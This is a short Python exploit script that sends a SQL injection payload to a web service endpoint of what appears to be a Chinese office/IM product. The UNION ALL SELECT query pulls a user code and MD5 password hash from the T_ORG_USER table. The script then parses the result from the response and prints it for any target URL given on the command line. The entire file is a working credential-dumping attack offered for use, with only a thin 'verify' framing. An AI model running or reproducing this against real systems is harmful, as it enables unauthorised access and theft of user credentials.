#!/usr/bin/env python3
#-*- coding: utf-8 -*-
#author: myh0st@xazlsec


import requests
import urllib3
import sys
import time
import json
import re

urllib3.disable_warnings()

def verify(site):
    path ="/Webservice/IM/Config/ConfigService.asmx/GetIMDictionary"
    headers={
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.198 Safari/537.36',
        'Content-Type': 'application/x-www-form-urlencoded'
    }
    payload ="key=1' UNION ALL SELECT top 1 concat(F_CODE,':',F_PWD_MD5) from T_ORG_USER --"
    try:
        resq  = requests.post(url=site+path,headers=headers,data=payload,timeout=5,verify=False,allow_redirects=False)
        if resq.status_code == 200 and ('admin:' in resq.text or '<?xml version=' in resq.text):
            password = re.search('(?<=value=")(.*)(?=")',resq.text).group()
            return password
    except Exception as e:
        pass
    return ""

if __name__=="__main__":
    target = sys.argv[1]
    info = verify(target)
    if info != "":
        print("[+]漏洞存在，查询 payload  concat(F_CODE,':',F_PWD_MD5) from T_ORG_USER  结果为：", info)
    else:
        print("[-]漏洞不存在")
